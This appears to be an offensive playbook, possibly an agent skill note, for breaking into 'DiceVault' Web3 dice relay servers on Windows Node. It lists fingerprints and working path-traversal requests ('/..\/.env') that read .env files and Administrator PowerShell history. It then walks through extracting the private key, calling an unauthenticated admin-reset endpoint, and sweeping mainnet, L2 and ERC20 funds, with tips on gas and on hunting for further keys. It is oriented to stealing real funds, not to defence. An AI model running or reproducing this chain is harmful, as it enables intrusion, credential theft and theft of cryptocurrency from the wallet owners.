# Web3 Dice / Relay on Windows Node — LFI → key → multi-chain sweep

Case shape: DiceVault / Provably Fair Dice (e.g. `*:3000`), ethers CDN, Sepolia title, self-written Node `createServer` static + `/api/*` relay.

## Fingerprints

- Title/body: DiceVault / Provably Fair / Sepolia / `ethers` + QR wallet connect
- Open: `/config.js`, `/package.json`, often **`/server.js`** (full relay source)
- APIs: `/api/events` `/api/stats` `/api/auto-bet` `/api/auth` `/api/admin-safe-reset` `/api/reveal-seed` `/rpc`
- Host OS: Windows paths in source (`C:\\dice-game\\frontend`), OpenSSH_for_Windows on :22

## High-ROI chain

```text
1) Download /server.js + /config.js — map pathname === '/api/…' and PRIVATE_KEY / dotenv path
2) Windows static LFI: baseDir + filePath with only '/'→'\' replace, NO normalize
   Working:  GET /..\/.env     → C:\dice-game\.env
             GET /..\..\Users\Administrator\…  (PS history, backup trees)
   Fail soft: plain /../.env may 404 depending on join; prefer /..\/ and /..\ forms
3) .env PRIVATE_KEY → derive address; compare to /api/health owner + /api/relay-status
4) Distinguish Hardhat#0 fallback (0xac0974be…f2ff80) from real .env key
5) Unauth admin: POST /api/admin-safe-reset {"owner":"<actualOwner>"}
   (body owner check only — no session); /api/reveal-seed may dump serverSeed
6) If user wants REAL funds: mainnet+L2 native + USDT/USDC/… BEFORE celebrating testnet
7) Ethplorer/etherscan token list for spam+real ERC20; sweep with tight EIP-1559 if gas thin
8) Keep hunting second keys: DiceGame_backup\.env, CodeBuddy logs, PSReadLine history,
   server-relay.js, deploy-*.ps1 — often only Hardhat/local repeats
```

## Pitfalls

- Testnet Sepolia/Arb-Sepolia/Amoy balances ≠ deliverable when user says「测试的不要」
- Sweeping native to 0 then discovering ERC20 (LINK) → need residual gas or fund-back
- `/api/admin-safe-reset` can drain **testnet pool** — still not mainnet cash
- Polygon Amoy / some RPCs need legacy gasPrice floors; Arb needs higher gasLimit than 21k
- SPA-like large `index.html` vs real files: DiceVault returns `Not Found: <path>` (not SPA fallback)
- `ssh2` in package.json ≠ SSH backdoor in server.js (dependency only)

## Checklist

- [ ] `/server.js` readable? dotenv path?
- [ ] `/..\/.env` and backup `.env` variants?
- [ ] Derived addr == on-chain owner/trustedRelay?
- [ ] Mainnet ETH/Arb/Base/BSC/Polygon + Ethplorer tokens?
- [ ] Second key hunt (backup/CodeBuddy/PS history) done?
- [ ] User testnet preference respected in reporting?

## Related

- Skill: `crypto-web-campaign-patterns`
- Case: `cases/43.133.252.51-3000/notes/REPORT.md`
